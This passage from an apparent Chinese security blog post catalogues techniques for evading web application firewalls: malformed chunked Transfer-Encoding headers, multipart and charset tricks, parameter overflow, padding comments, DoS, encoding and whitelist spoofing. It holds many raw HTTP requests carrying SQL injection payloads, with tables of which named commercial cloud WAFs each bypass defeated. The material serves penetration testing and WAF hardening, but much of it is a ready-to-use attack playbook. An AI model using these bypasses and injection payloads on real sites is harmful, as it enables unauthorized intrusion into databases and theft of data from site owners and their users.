class="attribute">(CRLF)</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><blockquote><p>也适用于报错即不处理的WAF</p></blockquote><p>云WAF基本不行，软WAF可以尝试</p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✘</td></tr><tr><td>腾讯云</td><td>✘=&gt;✔(guanjia)、✘(cloud)</td></tr><tr><td>百度云/cloudflare</td><td>✔=&gt;✘</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><p><strong>4. chunked添加混淆</strong></p><p><strong>条件：</strong></p><ul><li>Apache支持解析</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xxx chunked</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔</td></tr><tr><td>腾讯云</td><td>✔=&gt;✘</td></tr><tr><td>百度云/Cloudflare</td><td>✘=&gt;✔</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✔</td></tr></tbody></table><h4 id="分块欺骗"><a href="#分块欺骗" class="headerlink" title="分块欺骗"></a>分块欺骗</h4><p><strong>条件：</strong></p><ul><li>Tomcat会忽略畸形的分块头</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding%00: chunked#urldecode下</span><br><span class="line">Transfer-Encoding\00: chunked</span><br></pre></td></tr></table></figure><p>如果存在中间件忽略正常（或者畸形）的分块请求头且WAF会认真识别的情况，可以尝试</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8081</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 72</span><br><span class="line"><span class="attribute">Transfer-Encoding\00</span>: chunked</span><br><span class="line"></span><br><span class="line">3;&amp;xx=-1 union select user()</span><br><span class="line"><span class="attribute">foo</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute">(CRLF)</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔</td></tr><tr><td>腾讯云</td><td>✔</td></tr><tr><td>百度云</td><td>✘=&gt;✔</td></tr><tr><td>Cloudflare</td><td>✔ + (\00)</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✔</td></tr></tbody></table><p>其他一些混淆格式</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br><span class="line"><span class="attribute">Transfer-Encoding[空格]</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br><span class="line"><span class="attribute">[空格]Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bad-lucifer/HTTP-Request-Smuggling-Checker/blob/master/HTTP-Request-Smuggling-Checker.py</span><br><span class="line">[&quot;Transfer-Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding :chunked&quot;],</span><br><span class="line">[&quot;Transfer_Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer Encoding:chunked&quot;],</span><br><span class="line">[&quot; Transfer-Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:  chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:\tchunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:\u000Bchunked&quot;],</span><br><span class="line">[&quot;Content-Encoding: chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:\n chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding\n : chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: \&quot;chunked\&quot;&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: &apos;chunked&apos;&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: \n\u000Bchunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: \n\tchunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked, cow&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cow, &quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked\r\nTransfer-encoding: cow&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunk&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cHuNkeD&quot;],</span><br><span class="line">[&quot;TrAnSFer-EnCODinG: cHuNkeD&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: CHUNKED&quot;],</span><br><span class="line">[&quot;TRANSFER-ENCODING: CHUNKED&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked\r&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked\t&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cow\r\nTransfer-Encoding: chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cow\r\nTransfer-Encoding: chunked&quot;],</span><br><span class="line">[&quot;Transfer\r-Encoding: chunked&quot;],</span><br><span class="line">[&quot;barn\n\nTransfer-Encoding: chunked&quot;]</span><br></pre></td></tr></table></figure><h3 id="3-Content-Type编码"><a href="#3-Content-Type编码" class="headerlink" title="3. Content-Type编码"></a>3. Content-Type编码</h3><p><strong>条件：</strong></p><blockquote><p>WAF针对该方式进行内容识别时才可能会绕过，如果是整个POST包的匹配就没戏了</p><p>目前云WAF基本都是整包识别</p></blockquote><h4 id="正常协议"><a href="#正常协议" class="headerlink" title="正常协议"></a>正常协议</h4><blockquote><p>还可以在这里面进行规则绕过，如果这里规则不一样的话可以尝试</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=8</span><br><span class="line"><span class="attribute">Content-Length</span>: 71</span><br><span class="line"></span><br><span class="line">--8</span><br><span class="line"><span class="attribute">Content-Disposition</span>: name="id"</span><br><span class="line"></span><br><span class="line">-1 union all select 1,2,3</span><br><span class="line">--8--</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✘</td></tr><tr><td>腾讯云</td><td>✘</td></tr><tr><td>百度云</td><td>✔=&gt;✘</td></tr><tr><td>cloudflare</td><td>✔</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><h4 id="结合分块传输"><a href="#结合分块传输" class="headerlink" title="结合分块传输"></a>结合分块传输</h4><p><strong>条件：</strong></p><p>各中间件均支持</p><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔(edu)=&gt;✘</td></tr><tr><td>腾讯云</td><td>✔(guanjia)✘(cloud)</td></tr><tr><td>百度云</td><td>✔=&gt;✘</td></tr><tr><td>Cloudflare</td><td>✔</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><h4 id="畸形协议"><a href="#畸形协议" class="headerlink" title="畸形协议"></a>畸形协议</h4><p><strong>条件：</strong></p><p>测试此方法的前提首先要确定WAF正确识别该形式的内容，而不是对整个POST包的检测</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=0000; boundary=1111</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-dataX boundary=0000</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/; boundary=8</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/whatever; boundary=8</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data;boundary=0000'1111</span><br></pre></td></tr></table></figure><p>参数欺骗</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="n1"; name="n2"</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=';filename="';name=payload;"</span><br></pre></td></tr></table></figure><h3 id="4-SSL加密算法不支持"><a href="#4-SSL加密算法不支持" class="headerlink" title="4. SSL加密算法不支持"></a>4. SSL加密算法不支持</h3><p><strong>原理：</strong></p><p>对于非嵌入型WAF，在解析SSL数据时，需要该SSL通信端服务器的密钥（非对称）。客户端在与Web服务器进行HTTPS通信时，协商SSL的加密方式可以有很多种，选择一种WAF无法识别但Web服务器可以识别的加密方式来绕过WAF检测。</p><p><strong>条件：</strong></p><p>HTTPS支持指定密钥</p><p><strong>步骤：</strong></p><p>相关工具见Github：</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p><a href="https://github.com/LandGrey/abuse-ssl-bypass-waf" target="_blank" rel="noopener">https://github.com/LandGrey/abuse-ssl-bypass-waf</a></p><p><strong>测试结果：</strong></p><p>待测试</p><h3 id="5-报错绕过"><a href="#5-报错绕过" class="headerlink" title="5. 报错绕过"></a>5. 报错绕过</h3><p>构造其他畸形请求让WAF解析报错，不再检测，但后端服务器仍支持解析</p><p><strong>条件：</strong></p><p>不同中间件的解析差异</p><p><strong>测试结果：</strong></p><p>根据具体请求和具体WAF，来具体分析</p><h4 id="xxx-as-GET"><a href="#xxx-as-GET" class="headerlink" title="xxx as GET"></a>xxx as GET</h4><p>影响范围：apache+php GET方式</p><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔</td></tr><tr><td>腾讯云</td><td>✔</td></tr><tr><td>百度云</td><td>✔</td></tr><tr><td>cloudflare</td><td>✘</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✘</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><h4 id="TAB-as-SPACE"><a href="#TAB-as-SPACE" class="headerlink" title="TAB as SPACE"></a>TAB as SPACE</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST/?page_id=-15 HTTP/1.1</span><br></pre></td></tr></table></figure><p><strong>条件：</strong></p><p>Apache</p><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔</td></tr><tr><td>腾讯云</td><td>✔</td></tr><tr><td>百度云/cloudflare</td><td>✔</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✔</td></tr></tbody></table><h4 id="参数空格"><a href="#参数空格" class="headerlink" title="参数空格"></a>参数空格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /xxx/a.jsp?x= &amp;id=union%20all%20select%20@@version HTTP/1.1</span><br></pre></td></tr></table></figure><p>将HTTP原始数据包的<code>&quot;x=&quot;</code>后面设置为空格，某些硬件WAF就会忽略后面的<code>&amp;id=union%20all%20select%20@@version</code>参数从而绕过WAF。</p><p><strong>条件：</strong></p><p>Tomcat</p><p><strong>测试结果：</strong></p><p>云WAF全✘</p><h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a><strong>GET+POST</strong></h4><blockquote><p>代码逻辑角度</p></blockquote><p>当同时提交 GET、POST 请求时，进入 POST 逻辑，而忽略了 GET 请求的有害参数输入,可轻易 Bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/test.php?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br><span class="line">[POST]</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p><strong>条件：</strong></p><p>某种WAF。。</p><p><strong>测试结果：</strong></p><p>云WAF全✘</p><h3 id="6-Charset编码"><a href="#6-Charset编码" class="headerlink" title="6. Charset编码"></a>6. Charset编码</h3><blockquote><p>理论上很多WAF都无法识别，但是实际可以操作的环境极少，ASP.NET可能ok</p><p>可能因为中间件和框架过滤器一般都会设置UTF-8作为默认解码/编码参数，导致无法利用</p></blockquote><p>HTTP请求头<code>Content-Type</code>的<code>charset</code>编码可以指定内容编码，这个值一般都是UTF-8编码的，但恶意攻击者可以指定使用<code>ibm037</code>、<code>ibm500</code>、<code>cp875</code>、<code>ibm1026</code>等不常用的编码来进行绕过。</p><p>Content-Type头中使用charset定义字符集的应用场景不只有在responses中，request中同样可以使用，而变换http字符编码集以后，基于规则引擎的WAF则彻底失控：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=ibm500</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; charset=ibm500,boundary=8</span><br><span class="line"></span><br><span class="line">%60%F1%40%A4%95%89%96%95%40%A2%85%93%85%83%A3%40%F1k%F2k%F3</span><br></pre></td></tr></table></figure><p><img src="/2020/05/20/WAF普及篇/image-20200506213900756.png" alt="image-20200506213900756"></p><p>有个工具可以便捷化测试：HTTPSmuggler </p><p>Burpsuite的HTTP Request Smuggler插件</p><p>Burp插件地址：<a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a></p><p>ASP.NET框架还支持一个额外的请求头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-up-devcap-post-charset: ibm500</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p>无复现环境</p><h3 id="7-传输层"><a href="#7-传输层" class="headerlink" title="7. 传输层"></a>7. 传输层</h3><blockquote><p>理论上应该不行</p></blockquote><p>借鉴绕过IDS的一些方法，比如数据分片、和乱序等</p><p><strong>测试结果：</strong></p><p>待测试</p><h3 id="8-本段总结"><a href="#8-本段总结" class="headerlink" title="8. 本段总结"></a>8. 本段总结</h3><p>基于协议/中间件的姿势并非都能通杀，主要是不同中间件对HTTP的理解和运用有关，详细中间件系统和版本测试情况可参见表格<a href="https://github.com/irsdl/httpninja/blob/master/Results_v0.1.xlsx" target="_blank" rel="noopener">HTTP.ninja</a>。</p><h2 id="三、资源限制层面"><a href="#三、资源限制层面" class="headerlink" title="三、资源限制层面"></a>三、资源限制层面</h2><p>很多后端业务存在上传功能，所以请求数据限制上往往会较大，而前置WAF系统，需要有较高的响应时间，请求包较大时往往超过内置的性能和耗时阈值，所以可直接发送大量无意义的参数，尾端带攻击参数便可直接绕过WAF系统。</p><h3 id="1-参数溢出"><a href="#1-参数溢出" class="headerlink" title="1. 参数溢出"></a>1. 参数溢出</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=x&amp;id=x(&amp;id=x*n)&amp;id=-1 union select user(),2,3</span><br></pre></td></tr></table></figure><p>中间件解析情况</p><table><thead><tr><th>中间件</th><th>最多支持参数</th></tr></thead><tbody><tr><td>Apache</td><td>1000</td></tr><tr><td>Nginx</td><td>1001</td></tr><tr><td>Tomcat</td><td>10001</td></tr><tr><td>openresp(CVE-2018-9230)</td><td>100</td></tr></tbody></table><p>或者这种形式</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--0000</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="name"</span><br><span class="line">John Smith</span><br><span class="line">--0000--</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=“name"</span><br><span class="line"><span class="attribute">ATTACK</span></span><br><span class="line"><span class="attribute">--0000</span></span><br></pre></td></tr></table></figure><p><strong>测试结果</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✘(edu)✔(yq检测前1623个参数)</td></tr><tr><td>腾讯云</td><td>✘</td></tr><tr><td>百度云/Cloudflare</td><td>✔（目前仅检测前100个参数）</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔（检测前167=&gt;200个参数）</td></tr><tr><td>奇安信</td><td>✘</td></tr><tr><td>宝塔(Nginx版)</td><td>✔（目前仅检测前870个参数）</td></tr></tbody></table><h3 id="2-超长字符串"><a href="#2-超长字符串" class="headerlink" title="2. 超长字符串"></a>2. 超长字符串</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[POST]</span><br><span class="line">id=xxxxxxxx*n&amp;id=-1 union select user(),2,3</span><br></pre></td></tr></table></figure><p><strong>测试结果</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✘(edu)✔(yq)（POST超过8192字符会放弃检测）</td></tr><tr><td>腾讯云</td><td>✘</td></tr><tr><td>百度云/Cloudflare</td><td>✘</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔（POST在1030字符长度之后不检测）</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><h3 id="3-超长注释"><a href="#3-超长注释" class="headerlink" title="3. 超长注释"></a>3. 超长注释</h3><blockquote><p>也可以理解为匹配缓冲区大小固定</p></blockquote><p>WAF拿到一个数据之后，在对其进行内容匹配时，可能会将其放入一个固定大小的内存空间中，这个空间的大小是有限的。假设HTTP Request的body部分大小为2333字节，该内存大小为2000字节，那么其核心引擎在做内容匹配时，可能会先处理2000字节，再处理剩下的333字节。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[POST]</span><br><span class="line">id=-1 union/*填充字符*/select user(),2,3</span><br></pre></td></tr></table></figure><p><strong>测试结果</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✔（填充字符大约13610以上）</td></tr><tr><td>腾讯云</td><td>✘</td></tr><tr><td>百度云/Cloudflare</td><td>✘</td></tr><tr><td>创宇盾</td><td>✘</td></tr><tr><td>京东云</td><td>✔（填充字符大约82=&gt;52以上）</td></tr><tr><td>奇安信</td><td>✔（填充字符大约30以上）</td></tr></tbody></table><h3 id="4-缓冲区溢出"><a href="#4-缓冲区溢出" class="headerlink" title="4. 缓冲区溢出"></a>4. 缓冲区溢出</h3><p>WAF和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么WAF可能就会崩溃，即使不能代码执行那也会使WAF无法正常运行。这样，WAF的安全防护自然也就被瓦解了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p>待测试</p><h3 id="5-Dos攻击【不建议】"><a href="#5-Dos攻击【不建议】" class="headerlink" title="5. Dos攻击【不建议】"></a>5. Dos攻击【不建议】</h3><blockquote><p>中小公司的防火墙的流量处理能力比较弱，DOS可以当作<code>最后的方案</code>。</p><p>利用Dos前确定得到允许，否则将承担法律风险。</p></blockquote><ol><li>针对中间件本身的漏洞(例如:CVE-2018-1336、HTTP慢速攻击等)或者配置错误来触发DOS，当系统能耗达到阈值，自动关闭WAF模块。</li><li>针对WAF系统的正则策略进行攻击，通过<a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">ReDoS</a>使策略检测超时，单条会话跳过WAF集群响应，直接通联后端业务。</li></ol><p><strong>测试结果：</strong></p><p>待测试</p><h2 id="四、编码层面"><a href="#四、编码层面" class="headerlink" title="四、编码层面"></a>四、编码层面</h2><h3 id="1-base64、URL编码"><a href="#1-base64、URL编码" class="headerlink" title="1. base64、URL编码"></a>1. base64、URL编码</h3><p>有base64传输或者二次编码的情况下，过WAF没什么问题</p><p>也有简单的一次URL编码就能绕过的WAF，比如：百度云、cloudflare（这两个有时能，有时不能）</p><p><strong>URL</strong></p><p>直接URL不行，还可以结合其他姿势尝试在不同位置进行编码，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 %55nion %53elect/* !1,2,schema_name %0aFROM information_schema.SCHEMATA* /</span><br></pre></td></tr></table></figure><p><strong>Base64</strong></p><p>在Spring中，如果上传的文件名以<code>=?</code>开始并以<code>?=</code>结束，则调用<code>MimeDelegate.decode</code>来对文件名解码。MIME是邮件协议中用到的编码方式，这里我们可以将上传文件名改为<code>=?UTF-8?B?YS5qc3A=?=</code>，UTF-8代表字符编码，<code>?B?</code>代表后面的<code>YS5qc3A=</code>是base64编码的。经过Spring解码得到的文件名是<code>a.jsp</code>，而一般的WAF如果之前没有经过处理，那么就会出现在WAF中上传文件名过滤被绕过的问题。</p><h3 id="2-Unicode编码"><a href="#2-Unicode编码" class="headerlink" title="2. Unicode编码"></a>2. Unicode编码</h3><blockquote><p>这种编码，如果WAF与业务配合不紧密，一般都不会检测</p></blockquote><p><strong>JSON</strong></p><p>JSON支持将key或vaule替换成\uxxxx形式的unicode字符。</p><p>想要在HTTP请求体中传递JSON数据，Content-Type需要指定application/json类型；</p><p>如果是三方库，比如fastjson，content-type不做要求。</p><p><strong>IIS</strong></p><p>IIS ASP支持类似<code>Unicode %u0027</code>的编码，还会对不合法的URL编码进行字符删除。</p><ul><li><p>IIS ASP对<code>s%elect</code>编码的处理结果为<code>select</code></p></li><li><p>Nginx的<code>ngx_unescape_uri</code>函数对它的解码结果为<code>slect</code></p><p>Nginx的<code>ngx_unescape_uri</code>函数在处理%编码时，如果<code>%</code>后面的第一个字符不在十六进制范围内，则会丢弃<code>%</code>；否则判断第二个字符是否在十六进制范围内，如果不在则会丢弃<code>%</code>和<code>第一个字符</code>。</p></li></ul><p><strong>OGNL</strong></p><p>表达式注入支持</p><h3 id="3-实体化编码"><a href="#3-实体化编码" class="headerlink" title="3. 实体化编码"></a>3. 实体化编码</h3><p><strong>XML</strong></p><p>XML支持实体化编码</p><p>发送请求前注意下Content-Type类型</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: application/xml</span><br></pre></td></tr></table></figure><h3 id="4-八进制"><a href="#4-八进制" class="headerlink" title="4. 八进制"></a>4. 八进制</h3><p><strong>OGNL</strong></p><p>表达式注入支持</p><h2 id="五、白名单策略"><a href="#五、白名单策略" class="headerlink" title="五、白名单策略"></a>五、白名单策略</h2><h3 id="1-IP白名单"><a href="#1-IP白名单" class="headerlink" title="1. IP白名单"></a>1. IP白名单</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-Real-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br></pre></td></tr></table></figure><p>有个Burp插件<a href="https://github.com/portswigger/bypass-waf" target="_blank" rel="noopener">Bypass-WAF</a>，也可以直接在BApp Store搜索</p><p><strong>测试结果：</strong></p><p>云WAF✘</p><h3 id="2-HOST白名单"><a href="#2-HOST白名单" class="headerlink" title="2. HOST白名单"></a>2. HOST白名单</h3><p><strong>条件：</strong></p><p>非云WAF</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: localhost:80</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:80</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p>待测试</p><h3 id="3-路径白名单"><a href="#3-路径白名单" class="headerlink" title="3. 路径白名单"></a>3. 路径白名单</h3><p><strong>条件：</strong></p><p>需要根据具体业务规则</p><p>比如后台白名单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#利用 PHP 中的 PATH_INFO 问题，随便挑选一个白名单加在后面，可成功 bypass</span><br><span class="line">/test.php/admin?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p>待测试</p><h3 id="4-静态资源白名单"><a href="#4-静态资源白名单" class="headerlink" title="4. 静态资源白名单"></a>4. 静态资源白名单</h3><p>当文件后缀名为 js、jpg、png 等静态资源后缀请求，类似白名单机制，waf 为了检测效率，直接略过这样一些静态资源文件名后缀的请求。</p><p><strong>条件：</strong></p><p>某种静态资源后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/test.xxx/#1.png#静态后缀强相关（可以fuzz）</span><br><span class="line">一般#就够了，下面是额外的一些姿势</span><br><span class="line">/test.php/1.png?xx=xx#Apache</span><br><span class="line">/Login.aspx/index.jpg#IIS</span><br><span class="line">GET /1.jpg;/../login.jsp?xx=xx#tomcat（京东云ok）</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><table><thead><tr><th>WAF产品</th><th>测试结果</th></tr></thead><tbody><tr><td>阿里云</td><td>✘</td></tr><tr><td>腾讯云</td><td>✔(guanjia)</td></tr><tr><td>百度云/cloudflare</td><td>✘</td></tr><tr><td>创宇盾</td><td>✔</td></tr><tr><td>京东云</td><td>✔</td></tr><tr><td>奇安信</td><td>✘</td></tr></tbody></table><h3 id="5-搜索引擎爬虫白名单"><a href="#5-搜索引擎爬虫白名单" class="headerlink" title="5. 搜索引擎爬虫白名单"></a>5. 搜索引擎爬虫白名单</h3><p>模拟爬虫的UA</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#百度PC</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">#百度移动端</span><br><span class="line">Mozilla/5.0 (iPhone; CPU 